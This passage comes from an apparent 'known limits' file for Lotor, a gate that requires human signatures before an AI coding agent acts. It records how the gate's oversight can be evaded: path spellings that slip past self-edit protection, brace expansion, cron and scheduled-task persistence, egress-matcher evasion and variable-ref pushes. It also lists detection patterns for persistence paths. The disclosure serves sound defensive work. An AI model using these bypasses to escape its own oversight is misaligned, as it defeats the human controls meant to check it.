against the file you are reading.

The stated purpose is to **find gaps and document them automatically**. The first
half is real and running. The second half does not exist.

**Every one of the entries above was written by hand, by an agent, inside an
interactive session.** Discovery is genuinely semi-automated: limit 32 was found by
the unattended overnight pass, which went looking for a field and reported its
absence rather than assuming it was there. But nothing anywhere writes to this file
except a human-driven session that remembers to.

**Limit 29 describes the symptom and this is the cause.** That entry worries about
the window between a fix landing and its disclosure being amended, and proposes CI
checks and `status:` fields. All of those presuppose a writer. There isn't one. The
confession log has no producer, which is the same shape as limit 37 (chain rows
written by a producer that lives outside this repo) and the same shape as
`src/charter` sitting two days with neither a producer nor a consumer while its
tests passed.

**The honest consequence: "automatically" is aspirational and should be read that
way** anywhere this project describes itself. What exists is a disciplined manual
practice with good habits around it. That is worth something and it is not what the
sentence claims.

**Why this is harder than pointing an agent at the code.** Two constraints found
the same day. Finding can happen blind, but **numbering and deduplication
structurally require the live file**, so they belong to whoever applies rather than
whoever discovers. And an automated confessor scored on entries produced will learn
to find the findable ones. The confession loop's whole design answered the
closure-Goodhart problem by rewarding discovery instead; rewarding discovery
mechanically reintroduces the same failure one door down. **A confessor with a quota
is a confessor that stops writing the expensive confessions.**

Not fixed. Nothing is proposed here either, because the tempting fix (an agent that
appends entries on a schedule) is the version most likely to produce volume and
least likely to produce this entry.

**Amended 2026-08-31, verified against `a2ac5e2` by reading the merge commit and
the branch that produced it. The factual claim above is no longer true. The hazard
it names is untouched.**

A producer exists. An unattended scheduled routine drafted entry 61, opened
[#37](https://github.com/githubscum/lotor/pull/37) from the branch
`lotor-lane/limit-61-permissive-warning`, and a human reviewed and merged it. No
interactive session was involved in the finding or in the writing, which is
exactly what the sentence "nothing anywhere writes to this file except a
human-driven session that remembers to" denied.

**What narrowed.** The producer gap is closed, and the human role moved from
author to reviewer. The numbering-and-deduplication constraint was not solved so
much as it dissolved: the routine runs against a checkout, so it numbers from the
live file itself, and the split this entry imagined between whoever discovers and
whoever applies never had to happen.

**What did not change, and it is the larger half.** The quota hazard is open and
nothing here addresses it. The routine is not scored on entries produced, but that
is a property of how it is currently pointed, not a property of the design.
Nothing stops it being scored that way tomorrow.

**The new writer is the thing this entry warned about.** Entry 61 was found by the
routine using the tool it reports on, so the first automated confession is
evidence for the mechanism and not evidence against the warning. A confessor that
reports on its own lane has an obvious interest in that lane looking productive.
Read the warning as live. The test is not whether entries keep appearing. It is
whether an expensive one appears against the routine's own interest, and this
amendment is not that one.

## 41. The MCP server answers from a process that can predate the fix

Found 2026-07-26 by walking into it, and the demonstration is the entry.

`query_receipts` was fixed at 19:36:55 CDT to report each row's type and to never
present an absent count as zero. At 20:45 the same tool returned pre-fix output, and
that stale output was read as a live defect and reported as a new finding to the
operator. It was not a defect. It was a **long-lived server process started before
the commit.**

An MCP server is spawned once by the client and persists across sessions, so any
change under `src/mcp/` is invisible until the client restarts. Nothing in the
response says which build answered.

**Why it is worse than an ordinary stale cache.** The tools this server exposes are
the ones whose entire job is to answer *what actually happened*. This project's own
strongest operating rule is that the record beats the reasoning, and it has been
right three times. **This is the one way the record can be wrong: not the chain,
which is intact and signed, but the reader in front of it running code that no
longer exists.** The chain said the same true thing the whole time.

Not fixed. The cheap mitigation is for every MCP response to carry the server's own
commit or build id, so a reader can see that the answer came from a version older
than the fix they are checking. Until then, after changing anything under
`src/mcp/`, restart the client before trusting its output, and treat a surprising
result from these tools as possibly a version question rather than a finding.

**NARROWED 2026-08-31. The mitigation named above is now shipped, and it does
slightly more than the entry asked for.** Every tool response carries a
`_lotorBuild` stamp: the package version, a digest of this repository's own
`.js` source under `src/` and `bin/` taken at process load, the process start
time, the pid, and a `sourceChangedSinceStart` boolean. When the source on
disk no longer matches what this process started with, the stamp adds a
`warning` telling the reader these answers come from a build that no longer
exists and to restart the client. When it matches, the warning is absent,
because a caveat that fires with nothing to report is limit 39.

Content, not mtime, is what is compared, which is the difference between a
detector and a nuisance: a `git checkout`, a `touch`, or an edit that is made
and then reverted all leave the running code equal to the code on disk, and
none of them should tell an operator to restart.

**What is narrowed, precisely: the reader is no longer silent about its own
age.** What is NOT closed, and is worth being blunt about, because this entry's
whole subject is a reader that was confidently wrong:

- **It compares disk against disk-at-start, not against the code the process
  actually loaded.** That is a proxy. It is a good one, since the process
  loaded from that disk moments before the first digest, but a module loaded
  by an absolute path from outside the repository is outside the fingerprint.
- **`node_modules` is not in the digest.** A dependency upgrade under a live
  server moves nothing and warns nobody.
- **Only `.js` files under `src/` and `bin/` are hashed.** Policy files,
  settings, and the chain itself are not source and are not covered.
- **A digest detects, it does not explain** (the same edge as limit 53). The
  stamp says the source moved. It cannot say what moved, and a reader still
  has to go to git for that.
- **The stamp is only as reachable as the reader's attention.** It rides on
  every response, but nothing forces anyone to look at it. This makes the
  staleness *visible*; it does not make it *impossible*, and the restart
  advice above still stands as the actual fix.

## 42. A signature is spent when the gate verifies it, not when the action succeeds

Found 2026-07-26, live, on a push.

An approval was signed and the gate approved it. `git push` then failed, because the
remote had moved and the histories had diverged. **The token was already consumed.**
Confirmed by reading `npm run tokens` rather than inferring: zero live, zero spent,
and the request absent from the expired list, which means consumed, because
consuming a token deletes its file.

So the operator signed for an action, the action did not happen, and the
authorization is gone. Signing again is required for the same intent.

**Distinct from the two neighbouring entries.** Limit 27 is a signature burned by
*mutating* the command. Limit 30 is a surplus signature *banking*. This is a
signature spent on a command the gate approved and the world refused.

**And it is probably not fixable at this layer, which is why it is disclosed rather
than queued.** The gate is a `PreToolUse` hook. It runs before the tool runs and
never sees the outcome, so "consume on success" is not implementable where the nonce
is recorded. Holding a nonce open pending a result the gate cannot observe would
also reopen the replay window that single-use nonces exist to close. The honest
statement is that **an approval authorizes an attempt, never an outcome**, and the
cost of a failed attempt falls on the human as another signature.

Practical consequence worth stating: before staging anything that can fail for
reasons outside the gate, especially a network operation, check the precondition
first. The `git fetch` that would have revealed the diverged history cost nothing and
was not run.

## 43. The per-action, per-path signature has costs that care cannot avoid

Recorded 2026-07-26 after an evening that spent roughly fifteen signatures on one
piece of work. Three separate costs, one mechanism: the primitive is bound to an
action and a path, and nothing else.

**Multi-hunk core work requires banking, and limit 30 frames it as an accident.**
That entry opens "found live, from a double-signing that was an accident." It is not
only an accident. For `Edit` the canonical request is the file path alone, so two
edits to one core file produce two requests that canonicalize identically, and the
two resulting tokens are completely interchangeable. Neither the operator nor the
gate can tell which was meant for which hunk. **Any task needing more than one edit
to one core file therefore requires exactly the credit balance limit 30 warns
against**, and the only way to avoid it is to sign, apply, then sign again, which
serialises the work against a sleeping human. The control's design makes its own
anti-pattern mandatory whenever the change is deeper than one hunk.

**Reverting costs a signature, though it only ever reduces capability.** Restoring a
core file to its committed state with `git checkout --` is gated as HIGH. Limit 19
already argues the principle for grants: "deleting requires no signature. That
direction fails safe, since removing a grant only ever reduces capability." The
grant layer honours it. The file layer does not, because the matcher sees a
protected path in a command and cannot tell restoration from modification. This was
paid twice in one evening.

**An `Edit` denial carries no PURPOSE line.** The mitigation shipped 2026-07-26 puts
an agent-stated purpose at the top of the denial, sourced from the `description`
field every tool call was said to carry. Tool calls that edit files do not carry
one, so the line silently does not appear for `Edit`, `Write` or `NotebookEdit`.
Commands get the context; file edits, which are the ones that hit `self-mod` most
often, get none. The fix that was supposed to make forgetting impossible covers
about half the traffic, and nothing said so until now.

None of the three is fixed. All three point the same way, which is that friction
relief belongs at the altitude of the plan rather than the action, and that
charters cannot supply it for the non-delegable core by construction.

## 44. Scheduled task and cron operations are not gated

**Status: closed for the honest-agent class 2026-08-25 (stdio42-codex-
20260821), residuals below. Found 2026-07-29 by an agent expecting a gate
ceremony on `Register-ScheduledTask` that never materialized; the task
registered clean, no staged approval, no receipt of a denial.**

Persistent unattended execution paths — Windows scheduled tasks
(`Register-ScheduledTask`, `schtasks /Create`, `New-JobTrigger`), POSIX cron
(`crontab`, `systemd-run --on-*`, `at`), and their equivalents — install an
execution channel that runs outside the harness with no MCP hook in its path.
The current matcher categories (`opaque-exec`, `egress-other`, `destructive`,
`push-protected`, `self-mod`, `publish`) pattern-match on command strings and
file paths. A cmdlet call with structured parameters that installs a recurring
script has no matchable action verb, and the file it writes on disk (the
scheduled-task database or a cron file) is not a path this repository considers
`self-mod`. So there is nothing in the current matcher set that would fire.

`AGENTS.md` in the operator's brain classifies scheduled work as Gate A. The
mechanism does not enforce it. Found 2026-07-29 by an agent expecting a gate
ceremony on `Register-ScheduledTask` that never materialized; the task
registered clean, no staged approval, no receipt of a denial.

The shape closest to a fix is a schedule-source-file gate — watch writes to
`%SystemRoot%\System32\Tasks\` on Windows and to `crontab` files, systemd-timer
units, and `atq` state on Linux — which detects the persistence artifact rather
than the invocation. Detection is not refusal: a scheduled task once registered
runs without the harness in its path, so preventing registration is the only
meaningful control at this altitude. What runs when a scheduled task fires is
back inside the harness (if the scheduled command is `claude` or an agent
process) or entirely outside it (if the scheduled command is a `.ps1` or shell
script), and only the first case is even in principle reachable by any hook.

**Closed 2026-08-25, on this entry's own suggested shape.** The invocation
matcher gained what it was missing (`at` with a time spec in command position,
`systemd-run --on-*`, `launchctl load|bootstrap|submit`,
`Register-ScheduledJob`), and — the half this entry said was closest to right —
a component-anchored persistence-artifact path surface (`/etc/cron.*`,
`/var/spool/cron`, systemd unit dirs, `Library/LaunchAgents|LaunchDaemons`,
`System32/Tasks`, XDG autostart) now gates from both halves: Edit/Write tool
paths via Rule 7b, and any command naming the path without enumerating writer
binaries. Strictly additive under the existing scope-escalation rule id; in
grazing mode these warn, as crontab always did. Residuals, stated:

- **Reads of artifact paths warn too.** `cat /etc/cron.d/foo` fires. A string
  matcher cannot separate reader from writer without enumerating writers,
  which leaks one writer per round.
- **Prose overlap on `at`.** An echo containing the literal words `at noon`
  fires; intent is not visible to a string matcher.
- **Enabling an existing unit by name stays free**: `systemctl enable --now
  evil.timer`, `launchctl enable`. The unit FILE is covered; the enable verb
  alone sweeps in mundane sysadmin work.
- **Exotic schedulers stay free**: `batch`, `anacron` invocations, `fcron`,
  SysWOW64's Tasks store, non-XDG session autostarts.
- **What a registered task later RUNS is still outside any hook**, exactly as
  this entry said: registration-time gating bounds what gets installed, not
  what installed things do at 03:00.

## 45. A QR is a broadcast medium, and PAP enforces acknowledgment, not privacy

The `--public` flag on `pap-export` forces the operator to acknowledge that the
encoded spine will be on a scannable medium anyone can read. Nothing about the
tool decides what is safe to publish. If the operator encodes personal data, it
is in the QR. The signature proves who authored the bundle, not that the bundle
is safe to distribute. Landed with PAP (WO-PAP-01) on 2026-08-09; the flag is a
discipline check in the same spirit as the self-cancelling-leak-grep lesson
(2026-07-20), where the tool cannot know what is private and must force the
human to say so.

## 46. A PAP signature proves authorship and integrity, never spine quality or safety

A verified PAP signature confirms that the bytes now decoded are the bytes the
chain key signed, at the timestamp in the manifest, keyed to the fingerprint in
the manifest. It says nothing about whether the spine boots a functional agent,
whether the identity described matches who the operator meant to publish, or
whether the running agent will behave. The Row B ceiling applies: a spine
transfers identity and policy, not capability, so the resulting agent's ceiling
is the receiving model's. Same class as the standing observation that receipts
are behavioral metadata, never intent — a signature is evidence of custody, not
of correctness.

## 47. The head hash verifies memoir integrity, never memoir availability

If a memoir URL is present in the manifest, the chain head hash lets a reader
detect tampering when they fetch the memoir. It does not guarantee the memoir
will be fetchable at all. A dead host is a dead memoir, and the QR still boots
the spine, because the memoir is optional. This is deliberate: publication
should not require perpetual hosting. What the bundle guarantees is that IF a
memoir is retrieved, its integrity is checkable; it makes no availability claim.

## 48. PAP bundle signing uses the chain key, not the approval key

Lotor's chain key is stored plaintext on the operator's machine (limit 8). A
`pap-export` bundle is signed with that key, not the passphrase-derived approval
key. So bundle authenticity is chain-key strength (per-machine, plaintext at
rest) rather than passphrase strength. An operator whose chain key is
compromised can have PAP bundles forged in their name. The design choice is
recorded rather than hidden: signing a bundle must not require an interactive
ceremony on every export, and the chain key already carries the same identity
claim on every receipt. An optional operator co-signature slot (a second
passphrase-signed field marking human-attested bundles) is deferred, not
shipped.

## 49. No pre-encode leak grep in PAP v1

`pap-export` does not scan the spine for likely-private patterns (phone numbers,
addresses, family names, credentials) before encoding. The `--public` flag is a
discipline check, not a content filter. A leak-grep pass would have to exclude
its own replacement tokens from the scan or it self-cancels (the 2026-07-20
lesson: a validator that scans its own output matches both the real pattern and
the placeholder the redaction introduced, and passes on every run). Queued for a
later signature sitting rather than shipped half-implemented. Until it exists,
the operator is the only filter, and limit 45 is why that is stated plainly.

## 50. Two digest fields exist for the same input, with different meanings

As of 2026-08-10, every `ran[]` item on a session receipt carries two digests
of the same tool input. `paramsDigest` is the legacy field: 16 hex characters
(64 bits) over an insertion-order `JSON.stringify`. `paramsDigestCanonical` is
the interop field: full 256-bit hex over a recursively key-sorted canonical
serialization (`params/1`). They are not interchangeable, and neither can be
derived from the other.

The split is deliberate (add-alongside, never replace) so that receipts written
before the change stay verifiable and readers can tell which rule produced
which value: receipts carrying `receiptSchema: 'receipt/2'` have both fields;
older receipts have only the short one. The costs, stated plainly:

- **Cross-era comparison is not defined.** A pre-`receipt/2` receipt cannot be
  content-matched against an external system's canonical digest at all. The
  seam only closes for receipts written after the wiring.
- **The short digest is weak as evidence.** 64 bits is fine for the parser's
  internal dedup and birthday-attackable (~2^32 hashes, laptop-feasible) as a
  commitment. Anything treating `paramsDigest` as an evidence binding is
  leaning on the wrong field; the full-length canonical digest is the one an
  external verifier should compare.
- **A reader who confuses the two gets silent nonsense.** Comparing a
  canonical digest against the short field (or vice versa) fails for shape
  reasons on inspection, but truncating the canonical digest to 16 characters
  and comparing produces a value that looks comparable and means nothing.

The correlation echo shipped in the same change has its own honest edge: the
`_observaCorrelationId` key is echoed verbatim from tool input, which means it
is attacker-writable by anything that can shape a tool call. The echo proves
an id was PRESENT at call time, never that the authorising system named by it
actually issued it. Binding the id to its issuer is the authorising system's
job (signature over its own decision record), not the witness's.

## 51. Receipts before the 2026-08-15 enrichment fold three outcomes into one label

Before the denial-enrichment seam (landed 2026-08-15, five signatures), every
gate outcome that was not `approved` wrote `decision: 'denied'`. The 4-way
enum (`approved` / `denied` / `stale_signature` / `unreachable`) refines
forward only: a signature-burn (token valid but stale or byte-mismatched on
retry) and an engine fault (the gate failing to reach a verdict) were both
indistinguishable from a deliberate deny on every receipt written before that
seam, and cannot be retroactively split — the chain is append-only and the
information was never recorded. A reader counting "blocked" across the seam
counts `denied` + `stale_signature` + `unreachable` after it and plain
`denied` before it; the pre-seam figure therefore UNDERCOUNTS nothing but
cannot be decomposed. The same applies to `ruleId`, `paramsDigestCanonical`,
and `heldMs`: absent on a receipt means written-before-the-seam, never
not-applicable. This is disclosure, not a defect: no historical receipt's
meaning changed, which was the load-bearing design constraint (Isaac's
Option A call, 2026-08-13).

## 52. Tool-definition pinning is listing-time only, and this harness lists nothing

The pin diff compares what the harness exposes when a tool listing is
handed to session-open. A mid-session mutation between listings is unseen;
the next listing is the next comparison point. A change that persists for
less than one listing window escapes the diff entirely. Sharper on the
harness this runs on today: Claude Code's SessionStart payload carries NO
tool listing, so on this harness `toolPins` is null and the receipt says
"harness exposed no tool listing at session-open" — the mechanism is live,
the feed is absent until a wrapper or a future harness provides `tools`.
Also: a `tp/1`→`tp/2` scheme bump tags the whole map `rebaselined`
(severity low), so for one session after a bump, content diffs are not
surfaced. The pin catches what the harness reports; it does not catch what
the harness withholds.

## 53. `matcherHash` proves the code was different, not what changed

Two receipts with different `matcherHash` values tell a reader the matcher
changed between them, not what changed. Recovering the "what" still means
reading the git history of `src/policy/index.js` for that time range. A
hash detects, it does not explain. Same for `observer.parser.hash` on
session-open receipts.

## 54. Captured thinking is self-report, and a quiet thought channel is unrecorded, not empty

`thinkingBlocks` on a session-end receipt is a list of digests of text the
model emitted. The receipt records that emission; it never records that
the emitted text faithfully describes what the model computed. The honest
wording is "the stated reasoning is on the record," never "we can tell
what it was thinking." And a harness that emits no thinking blocks (or a
model that does not produce them) yields a receipt with no
`thinkingBlocks` field at all — the parser never writes an empty array. A
reader cannot tell from one receipt whether the model had zero thoughts or
the channel was omitted. The honest reading of an absent thought layer is
"unrecorded," never "no thoughts."

## 55. `transcriptHash` binds the receipt to a file, not the file to the whole session

The digest proves which transcript bytes the session-end receipt was made
from, so a missing or altered transcript is a visible gap. It does not
prove every byte the session produced made it into the file: a harness
that truncates or drops before the file-write is invisible to this bind
(limit 1's completeness caveat, applied to the thought channel). And if an
attacker writes the transcript too, the hash matches — the bind is against
accidental loss and honest logging errors, not against a hostile harness
that controls the file.

## 56. The GET-query-string matcher is a fence, not a proof, and it knows which side it over-gates

The C1 fix (`hasDataCarryingQuery`, 2026-08-21) closes the hole in limit 2's
egress matcher: a plain GET carrying data in its query string is now matched
by sensitive param NAMES with non-empty values, or by payload-shaped VALUES
(decoded length over 64 and percent-, base64url-, or hex-shaped), over
non-loopback egress tools.

The residual, stated rather than found later:

- **Presigned URLs (X-Amz-*, X-Goog-*) are exempted by name-prefix.** A
  signed GET is an ordinary read, and the exemption list is explicit. A
  signer that uses a different prefix (custom `sig=`, `auth=`, `token=`
  query names) is NOT exempt and will gate or warn — which is the safe
  direction, and it costs a signature.
- **Long cursor/continuation tokens and long percent-encoded search terms
  (>64 chars) are NOT exempted.** They are data-shaped by construction; the
  cost of the miss (exfil) outranks the cost of the cry (a signature on a
  paginated read).
- **A determined adversary can evade the whole matcher** by renaming a
  parameter to a short innocent name and shipping a short encoded blob, or
  by chunking. That is limit 11's ceiling applied to this rule: the gate
  matches patterns, and patterns are evadable. The fix defends the honest
  agent making a consequential move without sign-off — the threat model of
  the whole table — not an adversary engineering around it.

## 57. The implicit-push rule reads git state, and its blind spots are named

The C3 fix (`resolvePushContext` + `isImplicitProtectedPush`, 2026-08-21)
closes the hole a bare `git push` opens: with no ref in the command text,
the protected-branch matcher now resolves the target from git state
(current branch, upstream, `push.default`) and gates when the bare target
is main/master, failing toward gating when the state cannot be resolved.

The residuals, stated rather than found later:

- **A shell-variable ref with an explicit remote is invisible.**
  `git push origin "$REF"` carries two positionals, so the explicit-ref
  shortcut treats it as an ordinary named push and the state resolver is
  never consulted; if `$REF` holds `main`, the push flows. The safe
  direction is preserved for the one-positional form (`git push "$REF"`):
  that still fails toward gating.
- **A two-positional variable ref is not caught**, for the same reason:
  `git push "$REMOTE" "$BRANCH"` looks like an ordinary named push to the
  text matcher. Only a resolver that evaluated shell variables would see
  it, and the gate does not execute shells.
- **State resolution costs 15-40ms, on push-shaped commands only.** The
  resolver is a bounded, few-call, hard-timeout git read that runs only
  when a command is push-shaped and carries no explicit ref; every other
  command pays nothing.
- **The resolver reads the session's cwd, not the command's effective
  directory.** The hook resolves git state from the directory the session
  was launched in; a push aimed elsewhere in the same command
  (`git -C <repo> push`, or after a `cd`) is judged against the wrong
  repo's state, in both directions. That is all PreToolUse can know
  without executing the shell.
- **Branch names whose last segment is main/master gate.** A local branch
  named `releases/main` pushed under `current` (or tracked that way) reads
  as protected. That is the accepted false-positive direction: a gate that
  fires too often costs a signature, a gate that misses ships code.

## 58. Brace expansion is expanded by the matcher now, and the cap fails closed

**Status: open (bounded). Found 2026-08-21 by a citizen on the 1f916 board
(LOTOR-C2), the cap half found the same day while verifying their fix.**

The self-mod command matcher substring-checks the literal command. Shell
brace expansion splits a protected fragment across syntax the matcher never
expanded: `touch src/{policy,gate}/probe.js` writes into two gate-deciding
directories and contained neither `src/policy/` nor `src/gate/` contiguously,
so it flowed free (real hook exit 0) while the un-braced spelling was denied.
No cipher, no wrapper, no concatenated verb: the honest-agent class, the same
shape as the 2026-07-24 terminator leaks. The fix expands comma brace groups
(nesting included) and checks the original command plus every expansion.
Strictly additive: more candidate strings, never fewer.

The residuals, stated rather than found later:

- **The variant cap fails closed, on purpose, and over-gates.** Expansion is
  bounded (4096 variants). Past the cap the command is unverified and the
  matcher returns a hit. The first version of this fix returned the
  unexpanded leftovers as-is, and because expansion is depth-first and pops
  the last option first, the leftovers at the cap were exactly the first
  options of the early groups: a protected fragment split across two groups
  in first position plus five harmless trailing binary groups slipped
  through a 64-variant cap. A command with thousands of brace variants is
  not an honest agent's stub one-liner; the cost of the wrong denial is a
  signature.
- **Sequence expansions are not expanded.** `{1..9}` and `{a..z}` are
  stepped over. A protected fragment split only by a sequence form still
  slips. Nobody has shown a protected path spelled that way; it is written
  down so the next person does not have to discover it.
- **Quoted braces over-gate.** `'src/{policy,gate}/x'` gates even though
  bash does not expand inside single quotes. Accepted direction.
- **It is still a text matcher.** Parameter expansion (`${...}`), globs,
  and anything the shell resolves at runtime remain outside it. Limit 11
  stands.

## 59. Extensionless execution is header-classified before execution, not bound to the bytes executed

**Status: bounded. Added with the listing-14 repair.**

An explicit local extensionless path such as `./deploy` is now resolved and
its first four bytes are read before the command runs. A shebang gates as a
script. ELF magic identifies a compiled binary and stays free. An existing
regular file with neither header gates as unknown. This closes the declared
PR #28 residual without pretending a filename reveals file type.

The residuals:

- **Time-of-check is not time-of-use.** The path or its target can be replaced
  after the hook reads it and before the shell executes it. The gate has no
  file descriptor handoff to bind those two moments.
- **Only explicit local paths are resolved.** A bare PATH command such as
  `deploy` is left to the shell. Searching PATH inside the hook would still
  race the shell and would add filesystem work to ordinary commands.
- **Only ELF is positively recognized as compiled.** Extensionless Mach-O,
  PE and other native formats fall into unknown and gate. That is an explicit
  false-positive boundary, not a claim that those files are scripts.
- **A missing, unreadable or non-file target is not gated.** The shell should
  refuse the same target, but a file created in the check/use interval is the
  same race named above.

Two boundaries this limit did not state when it was written, added at merge:

The cwd plumbing is dead. `isOpaqueExec` and `evaluate` accept a command-cwd
parameter and no caller anywhere passes it, so every classification runs from
the hook's own working directory. A `cd <dir> && ./deploy` in one command
string moves the shell's cwd where the classifier never looks, and the
extensionless file executes free. This is not a regression, the whole class
was free before, but the closure is partial and this is the seam.

The matcher now touches the filesystem. Classification is no longer a pure
function of the command string: the same command classifies differently
depending on what is on disk at hook time. The auditor's consequence: a
recorded decision can no longer be recomputed from the recorded input alone,
and matcherHash (limit 53) proves what the code was, never what the disk was.
TOCTOU was declared; environment-dependence of the decision is the same fact
seen from the record's side, and it needed saying in those words.

## 60. Thought sidecars are digest-bound but not chain-protected

Added 2026-08-29, with the thought-level cost rows (cost/4). One receipt
per session says what a session cost; the per-thought rows say where in
the session the cost went, one row per distinct assistant message. The
rows live in a sidecar file under `<home>/thoughts/`, and the receipt
carries `{ schema: 'thoughts/1', count, digest }`, where the digest is
SHA-256 over the exact sidecar bytes. That binding is computed before the
append, so the chain vouches for what the rows WERE at receipt time.

What it does not do, in three parts:

- **The sidecar is deletable without a signature.** The chain's own
  deletion protection does not extend to `<home>/thoughts/`. Deleting a
  sidecar orphans the digest in the receipt — a detectable absence, same
  class as a truncated transcript — but nothing stops the deletion.
- **A crash between append and write leaves a receipt whose sidecar never
  existed.** The digest still proves what the rows were; the local copy is
  simply missing, and a reader cannot tell this case from a later
  deletion.
- **Rows are usage numbers, not meaning.** A thought row carries token
  counts, a model id and a timestamp. It says nothing about what the
  thought did or why it cost that much — the same silence-is-not-safety
  ceiling every other receipt field already discloses.

## 61. The permissive-posture warning overstates its own inertness

Found 2026-08-31, by tripping it twice in one session.

`bin/hook-pre-tool-use.js:756-757` prints, whenever Lotor is in `loose` and the
harness reports a permissive mode:

> WARNING: Lotor is in LOOSE mode and the harness reports "auto". Neither layer is
> stopping anything; both are only recording.

**The second sentence is false, and it is false about the only two rules that still
matter in loose.** `src/policy/index.js:48-49` keeps `self-mod` and `mode-change` at
`gate` in every mode including `loose`. Everything else degrades to `warn` or `off`.
So in the exact configuration this warning describes, the gate is still stopping
edits to the gate and still stopping changes to the mode.

The warning is printed before `evaluate()` runs and is unconditional on the outcome,
so it cannot know what is about to happen. Observed live twice on 2026-08-31: the
same stderr block carried the sentence above and a `BLOCKED: self-mod` line, for the
same tool call. The tool contradicted itself inside one message.

**The failure direction is understatement, which is not the harmless one.** A reader
who takes the sentence at its word concludes the gate is inert in loose. The next
self-mod block then reads as a malfunction rather than as the design, which is the
posture that gets a gate disabled or routed around. It also misprices the operator's
own choice: someone selecting `loose` is told they turned everything off, when the
two protections that guard the gate itself are still live. **Understating coverage in
the honesty block is the same class as limit 39**, where a caveat invented specifics.
A reader who distrusts the numbers will trust the disclaimer, so the disclaimer is the
one line that cannot afford to be wrong.

Not fixed here. `bin/hook-*` is non-delegable core and belongs in a reviewed signing
sitting rather than riding along with a documentation change.

**The fix is to name the exceptions rather than claim there are none:** state that
`self-mod` and `mode-change` still gate, and that everything else is recording only.
That is one sentence longer and it is true. Deriving the list from the policy table
rather than hardcoding it would also keep the sentence honest if the table changes,
which is the failure that produced limit 39 in the first place.

## 62. The self-mod matcher folds slashes and case, and stops there, so an equivalent path spelling is ungated

Found 2026-09-01, by running fourteen spellings through the shipped matcher rather
than reading it. Twelve seconds of probing, seven misses.

`normalizePath()` in `src/policy/index.js` converts backslashes to forward slashes,
lowercases, and strips a trailing slash. The self-mod fragment list is then matched
as a plain substring on both paths: `cmdNorm.includes(frag)` for a command,
`pathContainsFragment()` for an `Edit`. **A doubled separator or a `.` segment
defeats both**, because neither is removed before the comparison and neither breaks
the path for the operating system:

| Spelling | Gated today | Opens the protected file |
|---|---|---|
| `<repo>/src/policy/index.js` | yes | yes |
| `<repo>/src//policy/index.js` | **no** | yes |
| `<repo>/src/./policy/index.js` | **no** | yes |
| `<repo>/src/./chain/index.js` | **no** | yes |
| `<repo>/bin//charter.js` | **no** | yes |
| `<repo>/./bin/./charter.js` | **no** | yes |

The right-hand column is measured, not argued: the test asserts it by writing a
canary file and reading it back through all three spellings.

**The `Edit` half is the one that matters.** The command half is a shell matcher and
the file already concedes (limit 34) that a command cannot be resolved. `Edit`,
`Write` and `NotebookEdit` carry a `file_path`, and limit 34 says outright that a
path **can be proven contained** and that the resolver in `core-paths.js` is the
better answer, not taken because it couples `src/policy` to `src/grant`. This entry
is what that deferral costs: not a theoretical drift in a hand-maintained list, but
a live, one-character bypass of the rule that protects the gate, the chain, the
store, the grant verifier and every script in `bin/`. `src/policy` stays at `gate`
in every mode including loose, and this walks around it in every mode.

**Not a new class, and that is the uncomfortable part.** Limit 22 was tilde and
`$HOME` spellings. LOTOR-C2 was brace expansion. This is a third spelling escape in
the same matcher, and all three were found the same way: by executing the matcher,
never by reading it. The pattern says the substring approach will keep leaking on
the command side, where it has to, and that the `Edit` side should stop being a
matcher at all.

**Also unfixed and less certain:** `src/policy./index.js` is ungated and Windows
strips trailing dots from a path component (the mechanism named in limit 22), but
`fs.existsSync` refused that spelling on the machine where this was found, so
whether a real write lands is **unverified**. Recorded so it is not lost, marked so
it is not quoted as proven.

**The fix is `src/policy` and therefore non-delegable core.** It is one clause in
`normalizePath` (collapse `/+`, drop `./` segments) plus the resolver swap limit 34
already specifies for the `Edit` path. It was attempted on 2026-09-01 and **the gate
refused it unsigned, correctly**. The bypass proved above was not used to land the
fix; it is queued for a signing sitting.

**Caution for whoever writes that clause:** `normalizePath` is applied to whole
command strings, not only to paths. Collapsing `/+` globally rewrites `https://x` to
`https:/x`, and other matchers in the same file read command text. The change needs
its blast radius checked across every caller, which is exactly why it belongs in a
reviewed sitting rather than in this entry.

`test/policy-selfmod-separator-spellings.test.js` asserts the current, defective
behavior with the plain spellings beside it as controls. **When the matcher is
fixed, that file fails.** The repair is to invert its assertions and amend this
entry in the same change, never to delete the block.

## 63. The matcher version stamp hashes the rule entry points, not the code that decides

Found 2026-09-02, by asking what `matcherVersionHash()` actually reads rather than
what its comment says it reads.

Every `gated-action`, `policy-warn`, grant and egress receipt carries a matcher
version. It is the field a reader uses to answer the only question that makes two
receipts comparable: **were these decided by the same rules?** The function's own
docstring calls it the "content hash of the matcher logic in force right now."

**It hashes thirteen top-level functions plus `RULE_TABLE` and `RULE_INFO`.**
`Function.prototype.toString()` returns a function's own source and nothing it
calls, so a helper is covered only if the `parts` array names it. The self-mod
deciders are not named: `selfModFragmentsForBase` (the protected-path list
itself), `isSelfModEdit`, `selfModCommandHit`, `normalizePath`,
`pathContainsFragment`, `expandBraces`, `stripHeredocBodies`, `stripMessageArgs`.
`isSelfMod` IS hashed and is a three-line dispatcher: it names the two matchers
and contains neither.

**Measured, not argued.** `test/policy-matcher-stamp-coverage.test.js` asserts the
absence directly against the hashed inputs, with controls asserting the hashed
bodies are present so the block cannot pass vacuously. On the build this entry was
written against, the stamp is `matcher/1 95291ff6385151ca`.

**What it costs.** Add a directory to the protected list, change how a path is
folded before it is matched, or widen the brace expander, and the gate stops a
different set of actions while the stamp stays byte-identical. Two receipts either
side of that change agree on the matcher version and disagree on the behavior.
**The failure runs the wrong way on purpose-built silence:** a matcher WEAKENED
between two runs keeps stamping the old, stronger version, so the record's own
account of why an action was allowed is wrong in the permissive direction. This is
a witness defect rather than an enforcement one, which is what makes it worth its
own entry: the gate still gates correctly, and the trace misdescribes it.

A shipped change demonstrates it. The stamp was introduced 2026-08-09 (commit
b1b7bf8, "Observer versioning: matcher hash and canonical params digest"). The
protected-path list gained an entry on 2026-08-23, two weeks later, which changed
what an unsigned Edit could touch. That list is not inside the hashed text, so a
receipt written before that date and one written after carry the same matcher
version and cannot be told apart by it.

**The repair, and why it is not done here.** Add the helpers to `parts` and bump
`MATCHER_SCHEMA` to `matcher/2` (the hashing METHOD changes, which is precisely
what that marker exists to record; the value changing on its own would otherwise
be indistinguishable from a rule edit). Historical receipts keep `matcher/1` and
stay honest about what they meant. That edit is `src/policy` and therefore
non-delegable core, so it queues for a signing sitting rather than riding along
with the disclosure.

**Residual after the repair, stated now.** A hash over function source is still a
hash over THIS module. Behavior that reaches the decision from outside it, such as
`src/policy/git-context.js` resolving a push target, would remain unstamped. The
honest ceiling is "the rules in this file", and the docstring should say that
